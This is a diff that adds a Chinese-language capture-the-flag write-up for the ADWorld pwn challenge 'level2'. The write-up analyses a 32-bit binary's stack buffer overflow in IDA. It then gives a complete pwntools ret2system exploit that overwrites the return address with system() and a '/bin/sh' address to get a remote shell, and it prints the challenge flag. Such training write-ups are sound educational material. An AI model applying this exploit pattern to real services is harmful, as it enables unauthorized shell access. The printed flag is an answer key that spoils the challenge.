@@ -304,6 +304,57 @@ io.interactive()
 
 ------
 
+#### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)
+
+先`file ./level2`查看文件类型再`checksec --file=level2`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/1.png)
+
+用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数，发现`vulnerable_function()`函数很可疑。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/2.png)
+
+双击`vulnerable_function()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x88`，即可用栈大小只有`136`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x100`个字节，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/3.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`r`的`4`个字节。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/4.png)
+
+双击`system()`函数查看详情，函数返回值直接是系统调用，因此构造`payload`时需要再加上`system()`函数的起始地址`0x8048320`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/5.png)
+
+`p32()`可以让我们将整数转换为`4`字节的小端序格式，`system()`函数的参数`command`要求`dword ptr 4`，所以进入到`system()`函数后，还需要构造`system()`函数的栈帧，我们可以用`0xDEADBEEF`来填充已分配但还未初始化的内存，也可以用`p32(0)`来填充四个字节。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/6.png)
+
+最后再加上`system()`函数中的参数`/bin/sh`的地址即可获得`shell`。这里用了`ELF`中的`search()`函数来获取`/bin/sh`的地址。
+
+编写`Python`代码即可得到`cyberpeace{5f581b52af1ababeb4636a8c9911e25d}`。
+
+```python
+from pwn import *
+
+io = remote('111.200.241.244', 53598)
+e = ELF('level2')
+system_address = e.symbols['system']
+log.success('system_address => %s' % hex(system_address).upper())
+bin_sh_address = e.search(b'/bin/sh').__next__()
+log.success('bin_sh_address => %s' % hex(bin_sh_address).upper())
+payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xDEADBEEF) + p32(bin_sh_address)
+# payload = b'a'*0x88 + b'fuck' + p32(0x8048320) + p32(0) + p32(0x804A024)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5055/7.png)
+
+------
+
+
+
 
 
 ------
